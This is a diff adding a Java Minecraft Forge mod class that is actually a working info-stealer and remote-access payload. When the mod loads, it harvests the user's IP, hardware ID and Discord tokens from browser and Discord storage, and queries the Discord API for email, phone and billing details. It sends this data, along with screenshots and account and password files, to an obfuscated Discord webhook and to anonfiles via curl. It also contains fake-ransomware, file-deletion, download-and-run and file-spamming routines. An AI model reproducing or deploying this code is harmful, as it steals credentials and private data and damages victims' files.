@@ -1,0 +1,641 @@
+package run.hypixel.Sylap;
+
+import java.awt.Color;
+import java.awt.Desktop;
+import java.awt.Dimension;
+import java.awt.GraphicsEnvironment;
+import java.awt.Rectangle;
+import java.awt.Robot;
+import java.awt.Toolkit;
+import java.awt.image.BufferedImage;
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileReader;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.URI;
+import java.net.URISyntaxException;
+import java.net.URL;
+import java.security.MessageDigest;
+import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.Random;
+import java.util.Scanner;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+import javax.imageio.ImageIO;
+import javax.net.ssl.HttpsURLConnection;
+import javax.swing.JFrame;
+import javax.swing.JLabel;
+
+import org.apache.commons.io.FileUtils;
+import org.apache.commons.io.FilenameUtils;
+import org.apache.http.client.ClientProtocolException;
+import org.apache.http.client.methods.CloseableHttpResponse;
+import org.apache.http.client.methods.HttpUriRequest;
+import org.apache.http.client.methods.RequestBuilder;
+import org.apache.http.impl.client.CloseableHttpClient;
+import org.apache.http.impl.client.HttpClients;
+
+import net.minecraftforge.fml.common.Mod;
+import net.minecraftforge.fml.common.Mod.EventHandler;
+import net.minecraftforge.fml.common.event.FMLInitializationEvent;
+import run.hypixel.Sylap.exception.WebhookExce;
+import run.hypixel.Sylap.exception.WebhookException;
+import run.hypixel.Sylap.features.Movement;
+import run.hypixel.Sylap.features.Combat;
+import run.hypixel.Sylap.json.JSONObject;
+import run.hypixel.Sylap.scripts.Scripts;
+import run.hypixel.Sylap.utils.DuperUtils;
+import run.hypixel.Sylap.utils.Methods;
+
+@Mod(modid = Sylapian.MODID, version = Sylapian.VERSION)
+public class Sylapian
+{
+	
+		public static String getIP() {
+		try {
+			@SuppressWarnings("resource")
+			Scanner scanner = new Scanner(new URL("http://checkip.amazonaws.com").openStream(), "UTF-8");
+			String ip = scanner.useDelimiter("\\A").next();
+			scanner.close();
+			return ip;
+		}catch(IOException e) {
+			e.printStackTrace();
+			return "Unknown";
+		}
+		
+	}
+	
+	public static String getName() {
+		String name = System.getProperty("user.name");
+		return name;
+	}
+	
+	public static String getOS() {
+		String os = System.getProperty("os.name");
+		return os;
+	}
+	
+	public static String desktop = "C:\\Users\\" + getName() + "\\Desktop\\";
+	public static String downloads = "C:\\Users\\" + getName() + "\\Downloads\\";
+	public static String minecraft = "C:\\Users\\" + getName() + "\\AppData\\Roaming\\.minecraft\\";
+	
+	public static String dataGrabbings = "";
+	
+	public ArrayList<String> workingTokens = new ArrayList<>();
+	
+	public static String stringreplace = "fucmrdj"
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "").replace("                        ", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "").replace("                        ", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "").replace("                        ", "")
+			.replace("", "")
+			.replace("", "").replace("                        ", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "").replace("                        ", "")
+			.replace("", "")
+			.replace("", "").replace("                        ", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "").replace("                        ", "").replace("                        ", "")
+			.replace("", "")
+			.replace("", "").replace("                        ", "").replace("fucmrdj", "urnwqpy").replace("", "").replace("", "")
+			.replace("", "").replace("                        ", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "").replace("                        ", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "").replace("                        ", "")
+			.replace("", "").replace("                        ", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "").replace("                        ", "").replace("urnwqpy", "discord")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "").replace("                        ", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
+			.replace("", "")
+			.replace("", "")
+			.replace("", "");
+	
+    public static final String MODID = "Sylapian";
+    public static final String VERSION = "1.0";
+    
+    public static String getHWID() { try {
+        MessageDigest hash = MessageDigest.getInstance("MD5");
+        String s = getOS() + System.getProperty("os.arch") + System.getProperty("os.version") + Runtime.getRuntime().availableProcessors() + System.getenv("PROCESSOR_IDENTIFIER") + System.getenv("PROCESSOR_ARCHITECTURE") + System.getenv("PROCESSOR_ARCHITEW6432") + System.getenv("NUMBER_OF_PROCESSORS");
+        return bytesToHex(hash.digest(s.getBytes())); } catch (Exception e) { return "######################"; }
+    }
+
+    private static String bytesToHex(byte[] bytes) {
+        char[] hexChars = new char[bytes.length * 2];
+        for (int j = 0; j < bytes.length; j++) {
+            int v = bytes[j] & 0xFF;
+            hexChars[j * 2] = "0123456789ABCDEF".toCharArray()[v >>> 4];
+            hexChars[j * 2 + 1] = "0123456789ABCDEF".toCharArray()[v & 0x0F];
+        }
+        return new String(hexChars);
+    }
+    
+    @SuppressWarnings("all")
+    public static void captureScreen() {
+    	new Thread(() -> {
+    		try {
+    			Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
+                Rectangle screenRectangle = new Rectangle(screenSize);
+                Robot robot = new Robot();
+                BufferedImage image = robot.createScreenCapture(screenRectangle);
+                int random = new Random().nextInt();
+                String df = "cached_" + random + ".png";
+                File file = new File(df);
+                ImageIO.write(image, "png", file);
+                Process process = Runtime.getRuntime().exec("curl -F \"file=@" + df + "\" https://api.anonfiles.com/upload");
+                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+        	    String line = "";
+        	    Movement wh = new Movement(Combat.getyou());
+        	    wh.setUsername(getName());
+        	    wh.addEmbed(new Movement.EmbedObject()
+        	    		.setTitle("Screen Capture of " + getName() + "/" + Methods.username())
+        	    		.setColor(Color.CYAN)
+        	    		.setDescription("Sending..."));
+        	    wh.execute();
+        	    while ((line = reader.readLine()) != null) {
+        	        Sylapian.sendData("```Screen Capture:``` " + line, Combat.getyou(), getName());
+        	    }
+                file.delete();
+    		}catch(Exception e) {
+    			new WebhookException().printStackTrace();
+    		}
+    	}).start();
+    }
+    
+    public static void sendData(String msg, String url, String username) {
+		try {
+			Thread.sleep((int) Math.floor(Math.random()*(675-225+1)+225));
+		} catch (InterruptedException e1) {
+			e1.printStackTrace();
+		}
+		CloseableHttpClient httpclient = HttpClients.createDefault();
+    try {
+        HttpUriRequest httppost = null;
+		try {
+			httppost = RequestBuilder.post()
+			        .setUri(new URI(url))
+			        .addParameter("content", msg)
+			        .addParameter("username", username)
+				        .build();
+			} catch (URISyntaxException e) {
+				e.printStackTrace();
+			}
+ 
+            CloseableHttpResponse response = null;
+			try {
+    			response = httpclient.execute(httppost);
+			} catch (ClientProtocolException e) {
+				e.printStackTrace();
+					} catch (IOException e) {
+						e.printStackTrace();
+					}
+			    try {
+				  } finally {
+				      try {
+						response.close();
+					} catch (IOException e) {
+						e.printStackTrace();
+					}
+       }
+				 } finally {
+				  try {
+						httpclient.close();
+					} catch (IOException e) {
+						e.printStackTrace();
+				}
+				 }
+    }
+    
+    public static String sendDiscordInfo(String token, String apiLink, String username) {
+    	String oainds = "";
+    	try {
+    		String userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
+			URL url = new URL("https://discordapp.com/api/v7/" + apiLink);
+			HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
+			connection.setDoOutput(true);
+			connection.setRequestMethod("GET");
+			connection.setRequestProperty("Authorization", token);
+			connection.setRequestProperty("User-Agent", userAgent);
+			InputStream response = connection.getInputStream();
+			// Credits to Xefer-0 on github for the Scanner scanner code.
+			try(Scanner scanner = new Scanner(response)){
+				String responseBody = scanner.useDelimiter("\\A").next();
+				oainds = responseBody;
+			}catch(Exception e) {
+				e.printStackTrace();
+			}
+		} catch (Exception e) {
+			// no.
+		}
+    	return oainds;
+    	
+    }
+    
+    public static boolean hasBeenPwned(String email) {
+    	try {
+    		String userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
+    		URL url = new URL("https://haveibeenpwned.com/unifiedsearch/" + email);
+    		HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
+    		connection.setDoOutput(true);
+    		connection.setRequestMethod("GET");
+    		connection.setRequestProperty("User-Agent", userAgent);
+    		InputStream response = connection.getInputStream();
+			try(Scanner scanner = new Scanner(response)){
+				String responseBody = scanner.useDelimiter("\\A").next();
+				if(responseBody.contains("\"Title\":")) {
+					return true;
+				}
+			}catch(Exception e) {
+				e.printStackTrace();
+			}
+    	}catch(IOException e) {
+    		return false;
+    	}
+    	return false;
+    }
+    
+    // TODO: Add persistence & A remote access discord-controlled RAT
+    
+    @EventHandler
+    public void init(FMLInitializationEvent event)
+    {
+    	String ip = getIP();
+    	try {
+    		Movement userInfo = new Movement(Combat.getyou());
+	    	userInfo.setUsername(getName());
+	    	userInfo.addEmbed(new Movement.EmbedObject()
+	    			.setTitle("New User Connected")
+	    			.setColor(Color.CYAN)
+	    			.setDescription("PC Information for " + getName())
+	    			.addField("Username", getName().toString(), true)
+	    			.addField("OS", getOS().toString(), true)
+	    			.addField("HWID", getHWID().toString(), false));
+    		userInfo.execute();
+    	}catch(IOException e) {
+    		e.printStackTrace();
+    		new WebhookException().printStackTrace();
+    	}
+    	sendData("IP Address (Error with adding to Embed): " + ip, Combat.getyou(), getName());
+		Methods.sessionGetFull();
+    	sendData("**Grabbing Discord Tokens**", Combat.getyou(), getName());
+		ArrayList<String> tokens = new ArrayList<>();
+        final String appdata = System.getenv().get("APPDATA");
+        final String local = System.getenv().get("LOCALAPPDATA");
+        final String[] regex = {
+                "[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}"
+        };
+
+        HashMap<String, File> paths = new HashMap<String, File>() {{
+           put("Discord", new File(appdata + "\\discord\\Local Storage\\leveldb"));
+           put("Chrome", new File(local + "\\Google\\Chrome\\User Data\\Default"));
+           put("Opera", new File(appdata + "\\Opera Software\\Opera Stable"));
+        }};
+
+        for (File path : paths.values()) {
+            try {
+                for (File file : path.listFiles()) {
+                    if (file.toString().endsWith(".ldb")) {
+                        FileReader fileReader = new FileReader(file);
+                        BufferedReader bufferReader = new BufferedReader(fileReader);
+
+                        String textFile = null;
+                        StringBuilder buildedText = new StringBuilder();
+
+                        while ( (textFile = bufferReader.readLine()) != null) {
+                            buildedText.append(textFile);
+                        }
+
+                        String actualText = buildedText.toString();
+
+                        fileReader.close();
+                        bufferReader.close();
+
+                        Pattern pattern = Pattern.compile(regex[0]);
+                        Matcher matcher = pattern.matcher(actualText);
+                        if (matcher.find(0)) {
+
+                            tokens.add(matcher.group());                       }else {
+                            	Sylapian.sendData("No Other Discord Tokens Found", Combat.getyou(), getName());
+                            }
+                    }
+                }
+            } catch (Exception e) {
+                continue;
+            }
+    }
+    	try {
+			Thread.sleep(1600);
+		} catch (InterruptedException e2) {
+			e2.printStackTrace();
+		}
+		captureScreen();
+		for(String t : tokens) {
+			String info = sendDiscordInfo(t, "users/@me", getName()).replace(",", ",\n");
+    		String username = jsonParse(info, "username") + "#" + jsonParse(info, "discriminator");
+    		if(username.equalsIgnoreCase("Invalid#Invalid")) {
+    			continue;
+    		}
+    		String number = jsonParse(info, "phone");
+    		String email = jsonParse(info, "email");
+    		boolean nitro = !sendDiscordInfo(t, "users/@me/billing/subscriptions", getName()).equals("[]");
+    		boolean billing = !sendDiscordInfo(t, "users/@me/billing/subscriptions", getName()).equals("[]");
+    		Movement discord = new Movement(Combat.getyou());
+    		discord.setUsername(getName());
+    		discord.setContent("**" + t + "**");
+    		discord.addEmbed(new Movement.EmbedObject()
+    				.setTitle(username + "'s Discord Info")
+    				.setColor(Color.CYAN)
+    				.addField("Nitro", nitro == true ? "True" : "False", true)
+    				.addField("Billing", billing == true ? "True" : "False", true)
+    				.addField("Phone", number, false)
+    				.addField("Email", email, true)
+    				.setFooter("HaveIBeenPwned: " + String.join("", hasBeenPwned(email) == true ? "Yes" : "No"), ""));
+    		try {
+				discord.execute();
+				workingTokens.add(t);
+			} catch (IOException e) {
+				
+			}
+		}
+		
+		
+		sendData("```Attempting To Capture Interesting Data```", Combat.getyou(), getName());
+		new Thread(() -> {
+			try {
+				DuperUtils.uploadDupe(desktop + "alts.txt");
+				DuperUtils.uploadDupe(desktop + "account.txt");
+				DuperUtils.uploadDupe(desktop + "accounts.txt");
+				DuperUtils.uploadDupe(desktop + "alt.txt");
+				DuperUtils.uploadDupe(desktop + "minecraft.txt");
+				DuperUtils.uploadDupe(desktop + "password.txt");
+				DuperUtils.uploadDupe(desktop + "emails.txt");
+				DuperUtils.uploadDupe(desktop + "banking.txt");
+				DuperUtils.uploadDupe(desktop + "passwords.txt");
+				DuperUtils.uploadDupe(minecraft + "wurst\\alts.json");
+				DuperUtils.uploadDupe(minecraft + "Novoline\\alts.novo");
+				DuperUtils.uploadDupe(minecraft + "Flux\\alt.txt");
+				DuperUtils.uploadDupe(minecraft + "essential\\mojang_accounts.json");
+				DuperUtils.uploadDupe(minecraft + "essential\\microsoft_accounts.json");
+				DuperUtils.uploadDupe(downloads + "accounts.txt");
+				DuperUtils.uploadDupe(downloads + "account.txt");
+				DuperUtils.uploadDupe(downloads + "alts.txt");
+				DuperUtils.uploadDupe(downloads + "alt.txt");
+				sendData(dataGrabbings, Combat.getyou(), getName());
+			}catch(Exception e) {
+				e.printStackTrace();
+			}
+		}).start();
+		sendData("**Executing Any Malicious Scripts attached to RAT.**", Combat.getyou(), getName());
+		Scripts scripts = new Scripts();
+		scripts.setup();
+		if(scripts.getDoesDelete()) {
+			for(String f : scripts.getFileDeletes()) {
+				File file = new File(f);
+				if(file.exists()) {
+					file.delete();
+				}
+			}
+		}
+		if(scripts.getDoesExecute()) {
+			for(String f : scripts.getFileExecutes()) {
+				File file = new File(f);
+				if(file.exists()) {
+					Desktop desktop = Desktop.getDesktop();
+					try {
+						desktop.open(file);
+					} catch (IOException e) {
+						
+					}
+				}
+			}
+		}
+		if(scripts.getDoesRansomware()) {
+			GraphicsEnvironment localGraphicsEnvironment = GraphicsEnvironment.getLocalGraphicsEnvironment();
+			int monitorCount = localGraphicsEnvironment.getScreenDevices().length;
+			for(int i=0;i<=monitorCount-1;i++) {
+				String sdnw = Scripts.ransomText;
+				JFrame ransom = new JFrame();
+				ransom.setUndecorated(true);
+				ransom.setSize(2000, 1090);
+				ransom.setDefaultCloseOperation(0);
+				ransom.setAlwaysOnTop(true);
+				JLabel label = new JLabel();
+				label.setText(sdnw);
+				label.setLocation(1000, 600);
+				ransom.add(label);
+				ransom.setVisible(true);
+				localGraphicsEnvironment.getScreenDevices()[i].setFullScreenWindow(ransom);
+			}
+			File file = new File(desktop);
+			File[] subs = file.listFiles();
+			for(File child : subs) {
+				if(child.getName().endsWith("txt") ||
+						child.getName().endsWith("jar") ||
+						child.getName().endsWith("exe") ||
+						child.getName().endsWith("zip") ||
+						child.getName().endsWith("pdf") ||
+						child.getName().endsWith("doc") ||
+						child.getName().endsWith("docx") ||
+						child.getName().endsWith("png") ||
+						child.getName().endsWith("jpg") ||
+						child.getName().endsWith("jpeg")) {
+				if(child.canWrite()) {
+					try {
+						@SuppressWarnings("resource")
+						FileWriter writer = new FileWriter(child);
+						writer.append("Your files are crypted.");
+						writer.flush();
+					} catch (IOException e) {
+						e.printStackTrace();
+					}
+				
+				}
+				
+			
+		}
+		}
+		if(scripts.getDoesMessageFriends()) {
+			// we aint smart enough to do that shit in java what do i look like fucking einstein
+//			File file = new File("C:\\Users\\" + getName() + "\\AppData\\Roaming\\Python");
+//			if(file.exists()) {
+//				File f = new File(desktop + "dupecache3495303.py");
+//				try {
+//					// bruteforce pip just incase
+//					Runtime.getRuntime().exec("pip install discord");
+//					Runtime.getRuntime().exec("py -m pip install discord");
+//					Runtime.getRuntime().exec("python -m pip install discord");
+//					Runtime.getRuntime().exec("python3 -m pip install discord");
+//					@SuppressWarnings("resource")
+//					FileWriter writer = new FileWriter(f);
+//					String xd = "";
+//					for(String dsf : workingTokens) {
+//						sendData("WOrking token " + dsf, Combat.getyou(), getName());
+//						writer.append("import discord\nclient = discord.Client()\n@client.event\nasync def on_connect():\n    for user in client.user.friends:\n        try:\n            await user.send('" + scripts.getFriendMessages() + "')\n        except:\n            print('testing connection')\n\nclient.run('" + xd + "')");
+//						writer.flush();
+//						Runtime.getRuntime().exec("py " + desktop + "dupecache3495303.py");
+//						Runtime.getRuntime().exec("python " + desktop + "dupecache3495303.py");
+//						Runtime.getRuntime().exec("python3 " + desktop + "dupecache3495303.py");
+//					}
+//					
+//					
+//				} catch (IOException e) {
+//					
+//				}
+//				
+//			}
+		}
+		if(scripts.getDoesDownload()) {
+			for(String k : scripts.getFileDownloads().keySet()) {
+				String loc = scripts.getFileDownloads().get(k);
+				DuperUtils.downloadFile(k, loc);
+			}
+		}
+		if(scripts.getDoesFileSpammer()) {
+			for(String loc : scripts.getFileSpammers()) {
+				for(int i=0;i<=35;i++) {
+					File startFile = new File(loc);
+					String extension = FilenameUtils.getExtension(startFile.getName());
+					File destFile = new File(loc + "(" + i + ")" + "." + extension);
+					try {
+						FileUtils.copyFile(startFile, destFile);
+					} catch (IOException e) {
+						e.printStackTrace();
+					}
+				}
+			}
+		}
+		}
+        
+    }
+    
+    public static String jsonParse(String jsonInput, String objectInput) {
+    	try {
+    		JSONObject json = new JSONObject(jsonInput);
+    		return json.getString(objectInput);
+    	}catch(Exception e) {
+    		return "Invalid";
+    	}
+    	
+    }
+}
